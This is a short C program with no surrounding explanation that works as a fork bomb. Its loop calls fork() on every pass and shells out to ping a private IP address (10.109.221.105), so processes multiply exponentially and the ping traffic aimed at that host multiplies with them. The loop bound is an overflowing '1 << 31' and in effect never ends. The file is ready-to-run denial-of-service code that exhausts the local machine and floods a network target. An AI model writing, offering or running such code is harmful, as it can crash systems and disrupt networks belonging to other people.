#include <stdlib.h>
#include <unistd.h>

int main() {
	long long int time = 1 << 31;
	while (time--) {
		fork();
		system("ping 10.109.221.105 -c 1");
	}
}
